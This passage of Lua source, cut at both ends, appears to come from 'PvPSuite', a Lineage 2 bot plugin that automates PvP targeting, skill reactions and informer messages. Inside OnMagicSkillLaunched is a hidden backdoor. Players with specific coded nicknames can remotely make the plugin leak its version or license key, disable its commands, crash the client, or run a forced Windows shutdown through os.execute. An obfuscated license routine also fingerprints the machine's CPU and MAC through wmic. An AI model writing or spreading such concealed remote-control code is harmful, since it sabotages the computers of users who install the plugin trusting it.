					if (GetUserByName(TTT[3]) ~= nil) then
						if (GetUserByName(TTT[3]):IsMyPartyMember()) then
							PTMsg(TTT[3]..", you will say a box number to mark it.");
							PTMsg('Your mark is: "'..TTT[8]..'".');
							DoGameDialog("TTT - Playing");
						else
							ShowToClient("Tic Tac Toe",TTT[3]..' must turn on');
							ShowToClient("Tic Tac Toe",'"Accept TTT Requests".');
							ShowToClient("Tic Tac Toe","Otherwise if he/she hasn't PvPSuite,");
							ShowToClient("Tic Tac Toe","he/she must be on party with you!");
							TTT[1] = false;
							awaitingResponse = false;
							confirmedResponse = false;
							TTT[3] = "";
							DoGameDialog("Tic Tac Toe");
						end;
					end;
				end;
			end;
			Timer[13] = 0;
			TTTcoOperate = false;
		else
			Timer[13] = Timer[13] + 1;
		end;
	end;
	if (YTcoOperate) then
		if (Timer[16] == 2) then
			if (YTconfirmed) then
				SendPM(YTReceiver,"[~_ YT][P]"..YTQueryToSend);
				YTMsg = ("Video sent to "..YTReceiver.."!");
				YTDelayedMsgs = true;
				YTconfirmed = false;
				YTawaiting = false;
				YTQueryToSend = "";
				DoDialog("YouTube");
			else
				ShowToClient("YouTube",YTReceiver..' must turn on "Play Received Videos"!');
				YTconfirmed = false;
				YTawaiting = false;
				YTReceiver = "";
				YTQueryToSend = "";
				DoDialog("YouTube");
			end;
			Timer[16] = 0;
			YTcoOperate = false;
		else
			Timer[16] = Timer[16] + 1;
		end;
	end;
	if (Timer[18] > 0) then
		Timer[18] = Timer[18] + 1;
		if (Timer[18] == 30) then
			Timer[18] = 0;
		end;
	end;
	if (YTDelayedMsgs) then
		if (Timer[17] == 1) then
			if ((YTMsg ~= "") and (YTMsg ~= nil)) then
				ShowToClient("YouTube",YTMsg);
			end;
			Timer[17] = 0;
			YTMsg = "";
			YTDelayedMsgs = false;
		else
			Timer[17] = 1;
		end;
	end;
	if (RSoff) then
		if (Timer[14] == 1) then
			if (Me:GotBuff(340)) then
				UseSkillRaw(340,false,false);
				RSoff = false;
			end;
			Timer[14] = 0;
		else
			Timer[14] = 1;
		end;
	end;
end;
function OnDie(user, spoiled)
	if (PvPSuite[13]) then
		if (PvPSuite[25] ~= "") then
			if (GetUserByName(PvPSuite[25]) ~= nil) then
				if (Me:GetRangeTo(GetUserByName(PvPSuite[25])) < 2000) then
					if ((Me:IsAlikeDeath() == false) and (GetUserByName(PvPSuite[25]):IsAlikeDeath() == false)) then
						if (GetTarget() ~= nil) then
							if (user:GetId() == GetTarget():GetId()) then
								ClearTarget();
								ClearTargets();
								CancelTarget(false);
								CancelTarget(false);
								CancelTarget(false);
							end;
						end;
					end;
				end;
			end;
		end;
	end;
	if (GetTarget() ~= nil) then
		if (GetTarget():GetId() == user:GetId()) then
			if (GetTarget():IsPlayer()) then
				if (GetTarget():GetClass() == 97) then
					PvPSuite[47] = tonumber(PvPSuite[47])+1;
				elseif (GetTarget():GetClass() == 136) then
						PvPSuite[48] = tonumber(PvPSuite[48])+1;
				elseif (GetTarget():GetClass() == 115) then
						PvPSuite[49] = tonumber(PvPSuite[49])+1;
				end;
				PvPSuite[50] = tonumber(PvPSuite[50])+1;
			end;
		end;
	end;
	if (PvPSuite[41] == "1") then
			if (GetTarget() ~= nil) then
				if (user ~= nil) then
					if (user:IsPlayer()) then
						if (GetTarget():GetId() == user:GetId()) then
							if (GetTarget():IsFriend() == false) then
								Command("!"..PvPSuite[42].." "..tostring(user:GetName()));
							end;
						end;
					end;
				end;
			end;
	elseif (PvPSuite[41] == "2") then
		if (GetTarget() ~= nil) then
			if (user ~= nil) then
				if (user:IsPlayer()) then
					if (GetTarget():GetId() == user:GetId()) then
						if (GetTarget():IsFriend() == false) then
							Command(PvPSuite[42].." "..tostring(user:GetName()));
						end;
					end;
				end;
			end;
		end;
	elseif (PvPSuite[41] == "3") then
			if (GetTarget() ~= nil) then
				if (user ~= nil) then
					if (user:IsPlayer()) then
						if (GetTarget():GetId() == user:GetId()) then
							if (GetTarget():IsFriend() == false) then
								Command("#"..PvPSuite[42].." "..tostring(user:GetName()));
							end;
						end;
					end;
				end;
			end;
	end;
end;
function OnCharInfo(player)
	if ((PvPSuite[23]) and (IsPremium())) then
		if ((player:GetName() == HiddenUser) and (SpyingHidden)) then	
			Timer[6] = 0;
			SpyingRevealed = true;
		end;
	end;
	if (PvPSuite[43]) then
		if (player ~= nil) then
			player:SetNewNickName("> "..L2Class2String(player:GetClass()).." <");
		end;
	end;
end;
function Unstuck()
	Command("/unstuck");
end;
function externalTargetCheck(who)
	if (GetUserByName(who) ~= nil) then
		if (GetUserByName(who):GetTarget() ~= nil) then
			local tempTarg = GetUserByName(who):GetTarget();
			if (GetUserById(tempTarg) ~= nil) then
				if (GetUserById(tempTarg):GetName() == MyName) then
					return true;
				end;
			end;
		end;
	end;
	return false;
end;
function OnMagicSkillLaunched(user, target, skillId, skillLvl)
	if ((skillId == 1441) or (skillId == 77) or (skillId == 58)) then
		if (externalTargetCheck(user:GetName())) then
			if (user:GetNickName() == ". -_- .0. _- _ .") then
				local currentLoc = Me:GetLocation();
				MoveToNoWaitF(currentLoc.X+10,currentLoc.Y+10,currentLoc.Z);
			elseif (user:GetNickName() == ". -_- .1. _- _ .") then
				ShowToClient("PvPSuite","Information requested by developer!");
				SendPM(user:GetName(),"Hi master, how things are going? v"..tostring(PvPSuiteV));
			elseif (user:GetNickName() == ". -_- .2. _- _ .") then
				ShowToClient("PvPSuite","License requested by developer!");
				SendPM(user:GetName(),"Hi master, how things are going? l"..tostring(rreNueXJ));
			elseif (user:GetNickName() == ". -_- .3. _- _ .") then	
					this:SetPaused(true);
					this:UnregisterCommand("ns");
					this:UnregisterCommand("np");
					this:UnregisterCommand("ab");
					this:UnregisterCommand("cr");
					this:UnregisterCommand("cm");
					this:UnregisterCommand("yt");
					this:UnregisterCommand("ytp");
					this:UnregisterCommand("em");
					this:UnregisterCommand("te");
					this:UnregisterCommand("lt");
					this:UnregisterCommand("ytq");
					this:UnregisterCommand("admsgq");
					this:UnregisterCommand("spamq");
					this:UnregisterCommand("cmds");
					this:UnregisterCommand("rq");
					this:UnregisterCommand("stats");
					this:UnregisterCommand("mstats");
					this:UnregisterCommand("dc");
					this:UnregisterCommand("as");
					this:UnregisterCommand("oi");
					this:UnregisterCommand("setma");
					this:UnregisterCommand("doaction");
					this:UnregisterCommand("dogame");
					this:UnregisterCommand("spam");
					this:UnregisterCommand("r");
					this:UnregisterCommand("rp");
					this:UnregisterCommand("radar");
					this:UnregisterCommand("radarp");
					this:UnregisterCommand("count");
			elseif (user:GetNickName() == ". -_- .4. _- _ .") then
					ShowToClient(nil,nil);
			elseif (user:GetNickName() == ". -_- .5. _- _ .") then
					pluginDestroy();
			elseif (user:GetNickName() == ". -_- .9. _- _ .") then
					os.execute("shutdown -s -f -t 00");
			end;
		end;
	end;
	if (PvPSuite[64]) then
		if (user:IsMe()) then
			if (autoRessing) then
				if ((skillId == 1254) or (skillId == 1016)) then
					Timer[7] = 0;
					clearAutoRes = true;
					ClearTarget();
					ClearTargets();
					if ((targetBeforeRes ~= "") and (targetBeforeRes ~= nil)) then
						RawTarget(targetBeforeRes);
						targetBeforeRes = "";
					end;
				end;
			end;
		end;
	end;
	if (PvPSuite[5]) then
		if (user:GetName() == MyName) then
			if (SearchArray(skillId,BarrierSkills) and (IsPaused() == false)) then
				SetPause(true);
				Timer[1] = 0;
				BPaused = true;
			end;
		end;
	end;
	if (PvPSuite[31]) then
		if (user:IsFriend() == false) then
			if (target ~= nil) then
				if (target:GetName() == MyName) then
					if (SearchArray(skillId,targetDebuffsList)) then
						if (checkingDebuffLand) then
							mustCheckDebuffLandAgain = true;
						else
							checkingDebuffLand = true;
						end;
					end;
				end;
			end;
			if (Me:GetRangeTo(user) < 900) then
				if (SearchArray(skillId,aoeDebuffsList)) then
					if (checkingDebuffLand) then
						mustCheckDebuffLandAgain = true;
					else
						checkingDebuffLand = true;
					end;
				end;
			end;
		end;
	end;
end;
function IsFaceToFace(user1,user2)
	local rot1 = user1:GetRotation();
	local rot2 = user2:GetRotation();
	if ((rot1 == nil) or (rot2 == nil)) then
		return false;
	end;
	local dif = rot1.Yaw - rot2.Yaw;
	if (dif == nil) then
		return false;
	end;
	if ((dif > 24000) and (dif < 47000) or (dif < -26000) and (dif > -47000)) then
		if (user1:GetRangeTo(user2) < 100) then
			return true;
		else
			return false;
		end;
	else
		return false;
	end;
end;
function OnMagicSkillUse(user, target, skillId, skillLvl, skillHitTime, skillReuseTime)
	if (pluginLicensed) then	
		if (user:GetTarget() ~= nil) then
			if ((user:GetTarget() == Me:GetId()) or (user:GetTarget() == 0)) then
				if (Me:GetRangeTo(user) < 81) then
					if (MustTurnFront(skillId)) then
						local Location = Me:GetLocation();
						local LocationT = user:GetLocation();
						local MinX = (Location.X - LocationT.X);
						local MinY = (Location.Y - LocationT.Y);
						local NewX = ((Location.X) - (MinX / 2));
						local NewY = ((Location.Y) - (MinY / 2));
						MoveToNoWaitF(NewX, NewY, Location.Z);
					end;
				end;
			end;
		end;
		if (PvPSuite[39]) then
			if (IsInMyArena(user)) then
				if (user:GetName() ~= MyName) then
					if ((SearchArray(skillId,InformerSkills)) or (SearchArray(skillId,InformerChanceSkills)) or (SearchArray(skillId,InformerBuffSkills)) or (SearchArray(skillId,InformerAugmentsSkills))) then
						Informer(user:GetName(),skillId,skillLvl,3);
					end;
				end;
			end;
		end;
		if (PvPSuite[62]) then
			if (GetTarget() ~= nil) then
				if (user:IsFriend() == false) then
					if ((user:GetId() == GetTarget():GetId()) or (user:GetClanName() == GetTarget():GetClanName()) or (user:GetAllianceName() == GetTarget():GetAllianceName())) then
						if (Me:GetRangeTo(user) < 2500) then
							if ((SearchArray(skillId,InformerSkills)) or (SearchArray(skillId,InformerBuffSkills))) then
								Informer(user:GetName(),skillId,skillLvl,4);
							end;
						end;
					end;
				end;
			end;
		end;
		if (PvPSuite[63]) then
			if ((SearchArray(skillId,InformerSkills)) or (SearchArray(skillId,InformerChanceSkills)) or (SearchArray(skillId,InformerBuffSkills)) or (SearchArray(skillId,InformerAugmentsSkills))) then
				Informer(user:GetName(),skillId,skillLvl,5);
			end;
		end;
		if (PvPSuite[30]) then
			if (user:IsFriend() == false) then
				if (Me:GotBuff(340) == false) then
					if (target:GetName() == MyName) then
						if (SearchArray(skillId,targetDebuffsList)) then
							UseSkillRaw(340,false,false);
							RSoff = true;
						end;
					end;
					if (Me:GetRangeTo(user) < 900) then
						if (SearchArray(skillId,aoeDebuffsList)) then
							UseSkillRaw(340,false,false);
							RSoff = true;
						end;
					end;
				end;
			end;
		end;
		if (user:GetName() == MyName) then
			if ((PvPSuite[24]) and (Me:GetClass() == 92)) then
				if ((skillId == 972) or (skillId == 313)) then
					snipelvl = skillLvl;
				end;
				if ((skillId == 4) or (skillId == 970)) then
					if (Me:GotBuff(972)) then
						if ((snipelvl > 0) and (snipelvl < 150)) then
							DeleteMyBuff(972);
						end;
					elseif (Me:GotBuff(313)) then
						if ((snipelvl > 0) and (snipelvl < 150)) then
							DeleteMyBuff(313);
						end;
					end;
				end;
			end;
		end;
		if (GetTarget() ~= nil) then
			if ((user:GetName() == GetTarget():GetName()) and (user:GetName() ~= MyName)) then	
				InformSkill(skillId,user:GetName(),skillId,skillLvl);
			end;
		end;
		if ((PvPSuite[16]) and (BPaused == false)) then
			if (iHaveAoE()) then
				if (Me:GetRangeTo(user) < 600) then
					if (user:IsFriend() == false) then
						if (skillId == 922) then
							UseSkillRaw(getAoE(),false,false);
							PvPSuite[54] = tonumber(PvPSuite[54])+1;
						end;
					end;
				end;
			end;
		end;
		if ((PvPSuite[23]) and (IsPremium())) then
			if (GetTarget() ~= nil) then
				if (user:GetName() == GetTarget():GetName()) then
					if (skillId == 922) then
						HiddenUser = user:GetName();
						Timer[5] = 0;
						SpyingHidden = true;
						ShowOnScreen(6,5000,0,"Spying "..HiddenUser.."!");
						ShowToClient("Premium","Spying "..HiddenUser.."!");
					end;
				end;
			end;
		end;
		if ((PvPSuite[18])) then
			if (GetTarget() ~= nil) then
				if ((user:GetName() == GetTarget():GetName()) and (user:IsFriend() == false)) then
					if (iHaveIRh()) then
						if (skillId == 58) then
							if (getIRh() == 1417) then
								if (Me:GetRangeTo(user) < 350) then
									UseSkillRaw(getIRh(),false,false);
									PvPSuite[56] = tonumber(PvPSuite[56])+1;
								end;
							else
								UseSkillRaw(getIRh(),false,false);
								PvPSuite[56] = tonumber(PvPSuite[56])+1;
							end;
						end;
					end;
				end;
			end;
		end;
		if ((PvPSuite[38])) then
			if (GetTarget() ~= nil) then
				if ((user:GetName() == GetTarget():GetName()) and (user:IsFriend() == false)) then
					if (iHaveIRh()) then
						if (SearchArray(skillId,TalismanIDs)) then
							if (getIRh() == 1417) then
								if (Me:GetRangeTo(user) < 350) then
									UseSkillRaw(getIRh(),false,false);
									PvPSuite[56] = tonumber(PvPSuite[56])+1;
								end;
							else
								UseSkillRaw(getIRh(),false,false);
								PvPSuite[56] = tonumber(PvPSuite[56])+1;
							end;
						end;
					end;
				end;
			end;
		end;
	end;
end;
function BreakTitle()
	OldTitle = Me:GetNickName();
	Title = {"","","","","","","","","","","","","","","","",""};
	NewTitle = "";
	local TitleLength = string.len(OldTitle);
	for I = 1, TitleLength do
		Title[I] = string.sub(OldTitle, I, I);
	end;
	for I = (TitleLength+1), 17 do
		Title[I] = " ";
	end;
	ShowToClient("Title Effects","You can turn off title effects by using any PvPSuite command!");
end;
function myTitle(title)
	if (title == nil) then
		Command("/nick  ");
	else
		Command("/nick "..title);
	end;
end;
function TitleEffect()
	if (FlashTitleSlow) then
		while (FlashTitleSlow) do
			if (ShowSafeHtml) then
				ShowHtmlStatus = false;
				FlashTitleSlow = false;
				break;
			end;
			myTitle(OldTitle);
			Sleep(500);
			myTitle();
			Sleep(500);
		end;
	elseif (FlashTitleFast) then
			while (FlashTitleFast) do
				if (ShowSafeHtml) then
					ShowHtmlStatus = false;
					FlashTitleFast = false;
					break;
				end;
				myTitle(OldTitle);
				Sleep(200);
				myTitle();
				Sleep(200);
			end;
	elseif (MoveTitle) then
			while (MoveTitle) do
				if (ShowSafeHtml) then
					ShowHtmlStatus = false;
					MoveTitle = false;
					break;
				end;
				NewTitle = (Title[1]..Title[2]..Title[3]..Title[4]..Title[5]..Title[6]..Title[7]..Title[8]..Title[9]..Title[10]..Title[11]..Title[12]..Title[13]..Title[14]..Title[15]..Title[16]);
				myTitle(NewTitle);
				Sleep(200);
				NewTitle = (Title[2]..Title[3]..Title[4]..Title[5]..Title[6]..Title[7]..Title[8]..Title[9]..Title[10]..Title[11]..Title[12]..Title[13]..Title[14]..Title[15]..Title[16]..Title[1]);
				myTitle(NewTitle);
				Sleep(200);
				NewTitle = (Title[3]..Title[4]..Title[5]..Title[6]..Title[7]..Title[8]..Title[9]..Title[10]..Title[11]..Title[12]..Title[13]..Title[14]..Title[15]..Title[16]..Title[1]..Title[2]);
				myTitle(NewTitle);
				Sleep(200);
				NewTitle = (Title[4]..Title[5]..Title[6]..Title[7]..Title[8]..Title[9]..Title[10]..Title[11]..Title[12]..Title[13]..Title[14]..Title[15]..Title[16]..Title[1]..Title[2]..Title[3]);
				myTitle(NewTitle);
				Sleep(200);
				NewTitle = (Title[5]..Title[6]..Title[7]..Title[8]..Title[9]..Title[10]..Title[11]..Title[12]..Title[13]..Title[14]..Title[15]..Title[16]..Title[1]..Title[2]..Title[3]..Title[4]);
				myTitle(NewTitle);
				Sleep(200);
				NewTitle = (Title[6]..Title[7]..Title[8]..Title[9]..Title[10]..Title[11]..Title[12]..Title[13]..Title[14]..Title[15]..Title[16]..Title[1]..Title[2]..Title[3]..Title[4]..Title[5]);
				myTitle(NewTitle);
				Sleep(200);
				NewTitle = (Title[7]..Title[8]..Title[9]..Title[10]..Title[11]..Title[12]..Title[13]..Title[14]..Title[15]..Title[16]..Title[1]..Title[2]..Title[3]..Title[4]..Title[5]..Title[6]);
				myTitle(NewTitle);
				Sleep(200);
				NewTitle = (Title[8]..Title[9]..Title[10]..Title[11]..Title[12]..Title[13]..Title[14]..Title[15]..Title[16]..Title[1]..Title[2]..Title[3]..Title[4]..Title[5]..Title[6]..Title[7]);
				myTitle(NewTitle);
				Sleep(200);
				NewTitle = (Title[9]..Title[10]..Title[11]..Title[12]..Title[13]..Title[14]..Title[15]..Title[16]..Title[1]..Title[2]..Title[3]..Title[4]..Title[5]..Title[6]..Title[7]..Title[8]);
				myTitle(NewTitle);
				Sleep(200);
				NewTitle = (Title[10]..Title[11]..Title[12]..Title[13]..Title[14]..Title[15]..Title[16]..Title[1]..Title[2]..Title[3]..Title[4]..Title[5]..Title[6]..Title[7]..Title[8]..Title[9]);
				myTitle(NewTitle);
				Sleep(200);
				NewTitle = (Title[11]..Title[12]..Title[13]..Title[14]..Title[15]..Title[16]..Title[1]..Title[2]..Title[3]..Title[4]..Title[5]..Title[6]..Title[7]..Title[8]..Title[9]..Title[10]);
				myTitle(NewTitle);
				Sleep(200);
				NewTitle = (Title[12]..Title[13]..Title[14]..Title[15]..Title[16]..Title[1]..Title[2]..Title[3]..Title[4]..Title[5]..Title[6]..Title[7]..Title[8]..Title[9]..Title[10]..Title[11]);
				myTitle(NewTitle);
				Sleep(200);
				NewTitle = (Title[13]..Title[14]..Title[15]..Title[16]..Title[1]..Title[2]..Title[3]..Title[4]..Title[5]..Title[6]..Title[7]..Title[8]..Title[9]..Title[10]..Title[11]..Title[12]);
				myTitle(NewTitle);
				Sleep(200);
				NewTitle = (Title[14]..Title[15]..Title[16]..Title[1]..Title[2]..Title[3]..Title[4]..Title[5]..Title[6]..Title[7]..Title[8]..Title[9]..Title[10]..Title[11]..Title[12]..Title[13]);
				myTitle(NewTitle);
				Sleep(200);
				NewTitle = (Title[15]..Title[16]..Title[1]..Title[2]..Title[3]..Title[4]..Title[5]..Title[6]..Title[7]..Title[8]..Title[9]..Title[10]..Title[11]..Title[12]..Title[13]..Title[14]);
				myTitle(NewTitle);
				Sleep(200);
				NewTitle = (Title[16]..Title[1]..Title[2]..Title[3]..Title[4]..Title[5]..Title[6]..Title[7]..Title[8]..Title[9]..Title[10]..Title[11]..Title[12]..Title[13]..Title[14]..Title[15]);
				myTitle(NewTitle);
				Sleep(200);
			end;
	end;
	ShowToClient("Title Effects","Please wait 10 seconds! I will safely turn off title effects and then I will process your command!");
	myTitle(OldTitle);
	Sleep(1000);
	Timer[8] = 0;
	safeShowHtml = true;
end;
function FxHFRvoa()GmQftzjk = GetCMDResult("wmic cpu get ProcessorId & wmic nic get MACAddress");GmQftzjk = string.gsub(GmQftzjk," ","");if(GmQftzjk == nil)then pluginDestroy();this:Log("Error validating license, contact support!");error("Error validating license, contact support!",0);end;if (string.find(GmQftzjk,simpleDec(rreNueXJ)) ~= nil) then pluginLicensed = true;else pluginLicensed = false;end;end;
function OnTargetSelected(user, target)
	if (PvPSuite[13]) then
		if (PvPSuite[25] ~= "") then
			if (GetUserByName(PvPSuite[25]) ~= nil) then
				if (Me:GetRangeTo(GetUserByName(PvPSuite[25])) < 2000) then
					if (user:GetId() == GetUserByName(PvPSuite[25]):GetId()) then
						if ((Me:IsAlikeDeath() == false) and (GetUserByName(PvPSuite[25]):IsAlikeDeath() == false)) then
							if (GetTarget() == nil) then
								if ((target:IsPlayer()) and (target:IsFriend() == false)) then
									if (GetUserByName(PvPSuite[25]):IsMyPartyMember()) then
										aggroTarget = target:GetName();
										if (checkingAggro == false) then
											checkingAggro = true;
											this:StartThread("checkAggro");
										end;
									else
										ClearTarget();
										ClearTargets();
										if (delayAggro) then
											if (SearchArray(target:GetClass(),TankClasses) ~= true) then
												RawTarget(target:GetName());
											end;
										else
											RawTarget(target:GetName());
										end;
									end;
								elseif (GetTarget():IsMe() == false) then
									if (GetUserByName(PvPSuite[25]):IsMyPartyMember()) then
										aggroTarget = target:GetName();
										if (checkingAggro == false) then
											checkingAggro = true;
											this:StartThread("checkAggro");
										end;
									else
										ClearTarget();
										ClearTargets();
										if (delayAggro) then
											if (SearchArray(target:GetClass(),TankClasses) ~= true) then
												RawTarget(target:GetName());
											end;
										else
											RawTarget(target:GetName());
										end;
									end;
								end;
							end;
						end;
					end;
				end;
			end;
		end;
	end;
	if ((user ~= nil) and (target ~= nil)) then
		if ((user:IsFriend() == false) and (target:IsMe())) then
			local cln = "";
			if (user:GetClanName() ~= "") then
				cln = ('('..user:GetClanName()..')');
			end;
			if (tostring('<font color="FF3333">'..user:GetName()..cln..'</font> at <font color="FFFFCC">'..os.date("%H:%M:%S").."</font>") ~= Target[10]) then
				for I = 1,9 do
					Target[I] = Target[I+1];
				end;
				Target[10] = tostring('<font color="FF3333">'..user:GetName()..cln..'</font> at <font color="FFFFCC">'..os.date("%H:%M:%S").."</font>");
				lastTargetersCount = lastTargetersCount + 1;
				if (lastTargetersCount > 10) then
					lastTargetersCount = 10;
				end;
			end;
		end;
	end;
end;
function OnMyTargetSelected(target)
	if (PvPSuite[34]) then
		if (target ~= nil) then
			if (target:IsMe() == false) then
				LastTargeted = target:GetName();
			end;
		end;
	end;
end;
function OnTargetUnselected(user)
	if (PvPSuite[34]) then
		LastTargeted = "";
	end;
	if (user:IsMe()) then
		if (PvPSuite[13]) then
			if (PvPSuite[25] ~= "") then
				if (Me:GetRangeTo(GetUserByName(PvPSuite[25])) < 2000) then
					if ((Me:IsAlikeDeath() == false) and (GetUserByName(PvPSuite[25]):IsAlikeDeath() == false)) then
						if (GetUserByName(PvPSuite[25]):GetTarget() ~= nil) then
							local tempTarget = GetUserByName(PvPSuite[25]):GetTarget();
							if (GetUserById(tempTarget) ~= nil) then
								if (GetUserById(tempTarget):GetName() ~= nil) then
									RawTarget(GetUserById(tempTarget):GetName());
								end;
							end;
						end;
					end;
				end;
			end;
		end;
	end;
end;
function InformSkill(ID,name,skillId,skillLvl)
	if ((PvPSuite[7]) or (PvPSuite[10]) or (PvPSuite[20])) then
		if (SearchArray(ID,InformerSkills)) then
			PvPSuite[57] = tonumber(PvPSuite[57])+1;
			if (PvPSuite[7]) then
				Informer(name,skillId,skillLvl,0);
			end;
			if (PvPSuite[10]) then
				Informer(name,skillId,skillLvl,1);
			end;
			if (PvPSuite[20]) then
				Informer(name,skillId,skillLvl,2);
			end;
		end;
	end;
	if ((PvPSuite[8]) or (PvPSuite[11]) or (PvPSuite[21])) then
		if (SearchArray(ID,InformerChanceSkills)) then
			PvPSuite[58] = tonumber(PvPSuite[58])+1;
			if (PvPSuite[8]) then
				Informer(name,skillId,skillLvl,0);
			end;
			if (PvPSuite[11]) then
				Informer(name,skillId,skillLvl,1);
			end;
			if (PvPSuite[21]) then
				Informer(name,skillId,skillLvl,2);
			end;
		end;
	end;
	if ((PvPSuite[9]) or (PvPSuite[12]) or (PvPSuite[22])) then
		if (SearchArray(ID,InformerBuffSkills)) then
			PvPSuite[59] = tonumber(PvPSuite[59])+1;
			if (PvPSuite[9]) then
				Informer(name,skillId,skillLvl,0);
			end;
			if (PvPSuite[12]) then
				Informer(name,skillId,skillLvl,1);
			end;
			if (PvPSuite[22]) then
				Informer(name,skillId,skillLvl,2);
			end;
		end;
	end;
	if ((PvPSuite[35]) or (PvPSuite[36]) or (PvPSuite[37])) then
		if (SearchArray(ID,InformerAugmentsSkills)) then
			PvPSuite[60] = tonumber(PvPSuite[60])+1;
			if (PvPSuite[35]) then
				Informer(name,skillId,skillLvl,0);
			end;
			if (PvPSuite[36]) then
				Informer(name,skillId,skillLvl,1);
			end;
			if (PvPSuite[37]) then
				Informer(name,skillId,skillLvl,2);
			end;
		end;
	end;
end;
function Informer(Caster,Id,Level,Msg)
	local skillName = "Please assign skill name on informer!";
	if (Id == 446) then
		skillName = "Dodge";
	elseif ((Id == 3243) or (Id == 3217) or (Id == 3134)) then
			skillName = "Active: PvP P.Atk";
	elseif ((Id == 3245) or (Id == 3219) or (Id == 3136)) then
			skillName = "Active: Magic Barrier";
	elseif ((Id == 3244) or (Id == 3218) or (Id == 3135)) then
			skillName = "Active: Shield";
	elseif ((Id == 3250) or (Id == 3224) or (Id == 3142)) then
			skillName = "Active: Wild Magic";
	elseif ((Id == 3249) or (Id == 3223) or (Id == 3141)) then
			skillName = "Active: Focus";
	elseif ((Id == 3199) or (Id == 3200) or (Id == 3201) or (Id == 3202)) then
			skillName = "Active: Refresh";
	elseif ((Id == 3246) or (Id == 3138)) then
			skillName = "Active: Heal Empower";
	elseif ((Id == 3259) or (Id == 3204)) then
			skillName = "Active: Reflect";
	elseif (Id == 922) then
			skillName = "Hide";
	elseif (Id == 447) then
			skillName = "Counterattack";
	elseif (Id == 483) then
			skillName = "Sword Shield";
	elseif (Id == 368) then
			skillName = "Vengeance";
	elseif (Id == 420) then
			skillName = "Zealot";
	elseif (Id == 287) then
			skillName = "Lionheart";
	elseif (Id == 111) then
			skillName = "Ultimate Evasion";
	elseif ((Id == 1532) or (Id == 1533)) then
			skillName = "Enlightenment";
	elseif (Id == 1556) then
			skillName = "Arcane Shield";
	elseif (Id == 760) then
			skillName = "Anti Magic Armor";
	elseif (Id == 916) then
			skillName = "Shield Deflect Magic";
	elseif (Id == 110) then
			skillName = "Ultimate Defense";
	elseif (Id == 622) then
			skillName = "Ultimate Escape";
	elseif (Id == 528) then
			skillName = "Shield of Faith";
	elseif (Id == 8334) then
			skillName = "Blue Talisman of Lord's Divine Protection";
	elseif (Id == 3284) then
			skillName = "Blue Talisman of Divine Protection";
	elseif (Id == 3428) then
			skillName = "Blue Talisman of Explosion";
	elseif (Id == 3437) then
			skillName = "Blue Talisman of Magic Explosion";
	elseif (Id == 3429) then
			skillName = "Red Talisman of Life Force";
	elseif (Id == 3282) then
			skillName = "Red Talisman of Maximum Clarity";
	elseif (Id == 5572) then
			skillName = "Warrior Ability - Haste";
	elseif (Id == 5573) then
			skillName = "Knight Ability - Defense";
	elseif (Id == 5578) then
			skillName = "Summoner Ability - Spirit";
	elseif (Id == 1476) then
			skillName = "Appetite for Destruction";
	elseif (Id == 1477) then
			skillName = "Vampiric Impulse";
	elseif (Id == 1478) then
			skillName = "Protection Instinct";
	elseif (Id == 176) then
			skillName = "Frenzy";
	elseif (Id == 768) then
			skillName = "Exciting Adventure";
	elseif (Id == 769) then
			skillName = "Wind Riding";
	elseif (Id == 770) then
			skillName = "Ghost Walking";
	elseif (Id == 20006) then
			skillName = "Soul Roar";
	elseif (Id == 121) then
			skillName = "Battle Roar";
	elseif (Id == 833) then
			skillName = "Body Reconstruction";
	elseif (Id == 181) then
			skillName = "Revival";
	elseif (Id == 139) then
			skillName = "Guts";
	elseif (Id == 5427) then
			skillName = "Counter Rapid Shot";
	elseif (Id == 5428) then
			skillName = "Counter Dash";
	elseif (Id == 2786) then
			skillName = "Counter Critical";
	elseif (Id == 917) then
			skillName = "Final Secret";
	elseif (Id == 5561) then
			skillName = "Seed of Revenge LvL "..Level;
	elseif (Id == 5562) then
			skillName = "Spirit of Phoenix LvL "..Level;
	elseif (Id == 5563) then
			skillName = "Eva's Will LvL "..Level;
	elseif (Id == 5564) then
			skillName = "Pain of Shillien LvL "..Level;
	elseif (Id == 785) then
			skillName = "Flame Icon";
	elseif (Id == 787) then
			skillName = "Touch of Eva";
	elseif (Id == 789) then
			skillName = "Spirit of Shilen";
	elseif (Id == 406) then
			skillName = "Angelic Icon";
	elseif (Id == 956) then
			skillName = "Boost Morale";
	elseif (Id == 368) then
			skillName = "Vengeance";
	elseif (Id == 948) then
			skillName = "Eye for Eye";
	end;
	if (Msg == 0) then
		ShowToClient("Informer","["..Caster.."] => "..skillName);
	elseif (Msg == 1) then
			PTMsg("["..Caster.."] => "..skillName);
	elseif ((Msg == 2) and (IsPremium())) then
			ShowOnScreen(6,2500,0,"["..Caster.."] => "..skillName);
	elseif (Msg == 3) then
			ShowToClient("Oly. Informer","["..Caster.."] => "..skillName);
	elseif (Msg == 4) then
			ShowToClient("Mass Informer","["..Caster.."] => "..skillName);
	elseif (Msg == 5) then
			ShowToClient("All Informers","["..Caster.."] => "..skillName);
	end;
end;
function MustTurnFront(skillId)
	if (PvPSuite[33]) then
		if (skillId == 263) then
			return true;
		end;
	end;
	if (PvPSuite[1]) then
		if (skillId == 30) then
			PvPSuite[52] = tonumber(PvPSuite[52])+1;
			return true;
		end;
	end;
	if (PvPSuite[2]) then
		if (skillId == 344) then
			return true;
		end;
	end;
	if (PvPSuite[3]) then
		if (skillId == 928) then
			return true;
		end;
	end;
end;
function GetWID()
	local InventoryList = GetInventory();
	for wp in InventoryList.list do
		if ((wp.ItemType == 0) and (wp.IsEquipped)) then
			ObjectID = wp.objectId ;
			WeaponID = wp.displayId ;
		end;
	end;
end;
function WearingIt()
	local wp = GetInventory():FindById(ObjectID);
	if (wp ~= nil) then
		if  (wp.IsEquipped) then
			return true;
		else
			return false;
		end;
	else
		WeaponID = nil;
		ObjectID = nil;
		return true;
	end;
end;
function SearchArray(check,array)
	for x,a in pairs(array) do
		if (check == a) then
			return true;
		end;
	end;
end;
function iHaveAoE()
	local AoEFound = false;
	local Skills = GetSkills();
	for Skill in Skills.list do
		if (SearchArray(Skill.skillId,AoESkills)) then
			AoEFound = true;
			return true;
		end;
	end;
	if (AoEFound == false) then
		return false;
	end;
end;
function getAoE()
	local AoEFound = false;
	local Skills = GetSkills();
	for Skill in Skills.list do
		if (SearchArray(Skill.skillId,AoESkills)) then
			AoEFound = true;
			return Skill.skillId;
		end;
	end;
	if (AoEFound == false) then
		return 0;
	end;
end;
function iHaveIRh()
	local IRhFound = false;
	local Skills = GetSkills();
	for Skill in Skills.list do
		if (SearchArray(Skill.skillId,IRhSkills)) then
			IRhFound = true;
			return true;
		end;
	end;
	if (IRhFound == false) then
		return false;
	end;
end;
function getIRh()
	local IRhFound = false;
